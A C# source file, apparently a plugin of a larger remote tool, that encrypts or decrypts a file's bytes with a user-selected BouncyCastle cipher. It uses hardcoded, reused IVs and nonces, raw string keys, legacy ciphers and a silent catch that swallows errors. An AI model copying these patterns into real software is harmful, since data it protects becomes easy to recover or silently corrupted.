using System.Text;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Paddings;
using Org.BouncyCastle.Crypto.Parameters;
using PacketLib.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class Operation
    {
		internal static byte[] RunEncryptionDecryption(Algorithm algorithm, bool encrypt, string path, string key)
		{
			BCEngine DoIt;
			Others DoOthers;
			byte[] fileOperated = null;
			byte[] fileBytes = System.IO.File.ReadAllBytes(path);
			int sizeKey = Encoding.Default.GetBytes(key).Length * 8;
			try
			{
				switch (algorithm)
				{
					case Algorithm.Blowfish:
						DoIt = new BCEngine(new BlowfishEngine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Cast5:
						DoIt = new BCEngine(new Cast5Engine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Cast6:
						DoIt = new BCEngine(new Cast6Engine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.DesEde:
						DoIt = new BCEngine(new DesEdeEngine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.DesEngine:
						DoIt = new BCEngine(new DesEngine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Dstu7624:
						DoIt = new BCEngine(new Dstu7624Engine(sizeKey), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Gost28147:
						DoIt = new BCEngine(new Gost28147Engine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Idea:
						DoIt = new BCEngine(new IdeaEngine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Noekeon:
						DoIt = new BCEngine(new NoekeonEngine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.RC2:
						DoIt = new BCEngine(new RC2Engine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.RC532:
						DoIt = new BCEngine(new RC532Engine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.RC6:
						DoIt = new BCEngine(new RC6Engine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Rijndael:
						DoIt = new BCEngine(new RijndaelEngine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Seed:
						DoIt = new BCEngine(new SeedEngine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Serpent:
						DoIt = new BCEngine(new SerpentEngine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Skipjack:
						DoIt = new BCEngine(new SkipjackEngine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.SM4:
						//	DoIt = new BCEngine(new Org.BouncyCastle.Crypto.Engines.SM, encrypt);// bug with this algo
						break;

					case Algorithm.Tea:
						DoIt = new BCEngine(new TeaEngine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Threefish:
						DoIt = new BCEngine(new ThreefishEngine(sizeKey), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Tnepres:
						DoIt = new BCEngine(new TnepresEngine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Twofish:
						DoIt = new BCEngine(new TwofishEngine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Xtea:
						DoIt = new BCEngine(new XteaEngine(), encrypt);
						fileOperated = DoIt.Launch(fileBytes, key);
						break;

					case Algorithm.Chacha:
						DoOthers = new Others(encrypt);
						fileOperated = DoOthers.Chacha(fileBytes, key);
						break;

					case Algorithm.Chacha7539:
						DoOthers = new Others(encrypt);
						fileOperated = DoOthers.Chacha7539(fileBytes, key);
						break;

					case Algorithm.Salsa20:
						DoOthers = new Others(encrypt);
						fileOperated = DoOthers.Salsa20Engine(fileBytes, key);

						break;
					case Algorithm.XSalsa20:
						DoOthers = new Others(encrypt);
						fileOperated = DoOthers.XSalsa20Engine(fileBytes, key);
						break;

					case Algorithm.Vmpc:
						DoOthers = new Others(encrypt);
						fileOperated = DoOthers.VmpcEngine(fileBytes, key);
						break;

					case Algorithm.VmpcKsa3:
						DoOthers = new Others(encrypt);
						fileOperated = DoOthers.VmpcKsa3Engine(fileBytes, key);
						break;

					case Algorithm.RC4:
						DoOthers = new Others(encrypt);
						fileOperated = DoOthers.RC4Engine(fileBytes, key);
						break;

					case Algorithm.Isaac:
						DoOthers = new Others(encrypt);
						fileOperated = DoOthers.IsaacEngine(fileBytes, key);
						break;

					case Algorithm.HC256:
						DoOthers = new Others(encrypt);
						fileOperated = DoOthers.HC256Engine(fileBytes, key);
						break;

				}
				/*System.IO.File.WriteAllBytes(path, fileOperated);
				return true;*/
			}
			catch { }
			return fileOperated;
		}

		private class BCEngine
		{
			private readonly IBlockCipher _blockCipher;
			private PaddedBufferedBlockCipher _cipher;
			private IBlockCipherPadding _padding;
			private readonly bool Encrypt_B;

			public BCEngine(IBlockCipher blockCipher, bool ForEncrypt)
			{
				_blockCipher = blockCipher;
				Encrypt_B = ForEncrypt;
			}

			public void SetPadding(IBlockCipherPadding padding)
			{
				if (padding != null)
				{
					_padding = padding;
				}
			}

			public byte[] Launch(byte[] Data, string key)
			{
				byte[] result = BouncyCastleCrypto(Encrypt_B, (Data), key);
				return result;
			}

			/// <summary>
			///
			/// </summary>
			/// <param name="forEncrypt"></param>
			/// <param name="input"></param>
			/// <param name="key"></param>
			/// <returns></returns>
			/// <exception cref="CryptoException"></exception>
			private byte[] BouncyCastleCrypto(bool forEncrypt, byte[] input, string key)
			{
				try
				{
					_cipher = (_padding == null) ? new PaddedBufferedBlockCipher(_blockCipher) : new PaddedBufferedBlockCipher(_blockCipher, _padding);
					byte[] keyByte = Encoding.Default.GetBytes(key);
					_cipher.Init(forEncrypt, new KeyParameter(keyByte));
					return _cipher.DoFinal(input);
				}
				catch (Org.BouncyCastle.Crypto.CryptoException ex)
				{
					throw new CryptoException(ex.Message);
				}
			}
		}

		public class Others
		{
			private readonly bool Encrypt_B;
			public Others(bool ForEncrypt)
			{
				Encrypt_B = ForEncrypt;
			}
			public byte[] Chacha(byte[] data, string randomKeyBytes)
			{

				byte[] K = Encoding.Default.GetBytes(randomKeyBytes);
				ChaChaEngine cipher = new ChaChaEngine();
				cipher.Init(Encrypt_B, new ParametersWithIV(new KeyParameter(K), new byte[] { 1, 2, 3, 6, 5, 85, 78, 100 }));

				byte[] result = new byte[data.Length];
				cipher.ProcessBytes(data, 0, data.Length, result, 0);
				return result;
			}

			public byte[] Chacha7539(byte[] data, string randomKeyBytes)
			{

				byte[] K = Encoding.Default.GetBytes(randomKeyBytes);
				ChaCha7539Engine cipher = new ChaCha7539Engine();
				cipher.Init(Encrypt_B, new ParametersWithIV(new KeyParameter(K), new byte[] { 1, 2, 3, 6, 5, 85, 78, 100, 5, 85, 78, 100 }));

				byte[] result = new byte[data.Length];
				cipher.ProcessBytes(data, 0, data.Length, result, 0);
				return result;
			}

			public byte[] VmpcEngine(byte[] data, string randomKeyBytes)
			{

				byte[] K = Encoding.Default.GetBytes(randomKeyBytes);
				VmpcEngine cipher = new VmpcEngine();
				cipher.Init(Encrypt_B, new ParametersWithIV(new KeyParameter(K), new byte[] { 1, 2, 3, 6, 5, 85, 78, 100, 5, 85, 78, 100, 25, 214, 255, 32, 68 }));

				byte[] result = new byte[data.Length];
				cipher.ProcessBytes(data, 0, data.Length, result, 0);
				return result;
			}
			public byte[] RC4Engine(byte[] data, string randomKeyBytes)
			{

				byte[] K = Encoding.Default.GetBytes(randomKeyBytes);
				RC4Engine cipher = new RC4Engine();
				cipher.Init(Encrypt_B, new KeyParameter(K));

				byte[] result = new byte[data.Length];
				cipher.ProcessBytes(data, 0, data.Length, result, 0);
				return result;
			}


			public byte[] VmpcKsa3Engine(byte[] data, string randomKeyBytes)
			{

				byte[] K = Encoding.Default.GetBytes(randomKeyBytes);
				VmpcKsa3Engine cipher = new VmpcKsa3Engine();
				cipher.Init(Encrypt_B, new ParametersWithIV(new KeyParameter(K), new byte[] { 85, 78, 100, 5, 85, 78, 100, 25, 214, 255, 32, 68 }));

				byte[] result = new byte[data.Length];
				cipher.ProcessBytes(data, 0, data.Length, result, 0);
				return result;
			}


			public byte[] HC256Engine(byte[] data, string randomKeyBytes)
			{

				byte[] K = Encoding.Default.GetBytes(randomKeyBytes);
				HC256Engine cipher = new Org.BouncyCastle.Crypto.Engines.HC256Engine();
				cipher.Init(Encrypt_B, new ParametersWithIV(new KeyParameter(K), new byte[] { 1, 2, 3, 6, 5, 85, 78, 100, 5, 85, 78, 100, 25, 214, 255, 32, 68 }));

				byte[] result = new byte[data.Length];
				cipher.ProcessBytes(data, 0, data.Length, result, 0);
				return result;
			}

			public byte[] IsaacEngine(byte[] data, string randomKeyBytes)
			{

				byte[] K = Encoding.Default.GetBytes(randomKeyBytes);
				Org.BouncyCastle.Crypto.Engines.IsaacEngine cipher = new Org.BouncyCastle.Crypto.Engines.IsaacEngine();
				cipher.Init(Encrypt_B, new KeyParameter(K));

				byte[] result = new byte[data.Length];
				cipher.ProcessBytes(data, 0, data.Length, result, 0);
				return result;
			}


			public byte[] Salsa20Engine(byte[] data, string randomKeyBytes)
			{

				byte[] K = Encoding.Default.GetBytes(randomKeyBytes);
				Salsa20Engine cipher = new Salsa20Engine(148);
				cipher.Init(Encrypt_B, new ParametersWithIV(new KeyParameter(K), new byte[] { 1, 2, 3, 6, 5, 85, 78, 100 }));

				byte[] result = new byte[data.Length];
				cipher.ProcessBytes(data, 0, data.Length, result, 0);
				return result;
			}

			public byte[] XSalsa20Engine(byte[] data, string randomKeyBytes)
			{

				byte[] K = Encoding.Default.GetBytes(randomKeyBytes);
				XSalsa20Engine cipher = new XSalsa20Engine();
				cipher.Init(Encrypt_B, new ParametersWithIV(new KeyParameter(K), new byte[] { 1, 2, 3, 6, 5, 85, 78, 100, 9, 3, 2, 1, 4, 56, 23, 78, 156, 12, 14, 79, 65, 32, 14, 10 }));

				byte[] result = new byte[data.Length];
				cipher.ProcessBytes(data, 0, data.Length, result, 0);
				return result;
			}
		}
	}
}
